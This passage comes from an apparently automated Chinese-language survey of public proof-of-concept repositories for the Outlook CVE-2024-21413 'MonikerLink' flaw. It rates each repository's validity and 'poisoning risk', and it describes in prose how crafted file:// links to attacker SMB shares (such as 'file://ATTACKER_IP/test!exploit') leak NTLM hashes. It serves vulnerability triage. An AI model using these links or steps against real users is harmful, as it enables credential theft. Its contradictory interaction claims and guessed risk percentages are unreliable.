提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

